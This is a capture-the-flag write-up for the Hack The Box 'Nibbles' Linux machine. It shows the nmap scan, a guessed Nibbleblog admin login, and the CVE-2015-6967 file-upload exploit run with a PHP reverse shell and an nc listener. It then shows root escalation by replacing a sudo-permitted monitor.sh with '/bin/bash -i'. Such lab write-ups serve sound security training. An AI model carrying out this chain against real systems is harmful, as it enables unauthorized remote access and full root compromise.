# Nibbles

Machine Level: Easy <br />
OS: Linux

## Scanning 
I ran an aggressive NMAP scan and found some initial services and ports. 
```
ajread@aj-ubuntu:~$ nmap -A [TARGET IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-24 18:58 EST
Nmap scan report for [TARGET IP]
Host is up (0.015s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.98 seconds
```
## Enumeration 
I looked at the service on port 80 and found that it was a nibble blog. 
```
ajread@aj-ubuntu:~$ curl http://[TARGET IP]
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
After doing some research, I found that there is a CVE-2015-6967 that allows for unrestricted file uploads within one of plugins in Nibbleblog before a certain version (4.0.5) that can allow for RCE. I was able to find a login page at ```http://[TARGET IP]/nibbleblog/admin.php```. I guessed the password with username:[REDACTED] and password:[REDACTED]. 
## Initial Access
I found a proof of concept for the RCE [here](https://github.com/dix0nym/CVE-2015-6967). I created a payload from pentest monkeys php reverse shell [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). I started a listener on my local machine and ran the exploit. 
```
ajread@aj-ubuntu:~/hackthebox/CVE-2015-6967$ python3 exploit.py --url http://[TARGET IP]/nibbleblog/ --username [REDACTED] --pass [REDACTED] --payload php-reverse-shell.php 
[+] Login Successful.
[+] Upload likely successfull.
```
And I was dropped into a shell and was able to read the user flag.
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [TARGET IP] 46040
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:21:08 up 14:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ id 
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$ whoami
nibbler
$ wc -c /home/nibbler/user.txt
wc -c /home/nibbler/user.txt
33 /home/nibbler/user.txt
```
## Privilege Escalation 
I checked for what I could run as sudo on the machine. 
```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
I had to unzip the ```/personal``` folder. 
```
$ ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Jan 24 04:56 user.txt
$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
```
I wanted to rewrite the ```monitor.sh``` file with something to run as root. To do so, I wrote a ```monitor.sh``` with only the below in it. 
```
/bin/bash -i
```
I transfered the new ```monitor.sh``` file to the target machine and executed as sudo to gain a root shell to read the flag. 
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
bash: cannot set terminal process group (1339): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/home/nibbler/personal/stuff# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Nibbles:/home/nibbler/personal/stuff# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
```
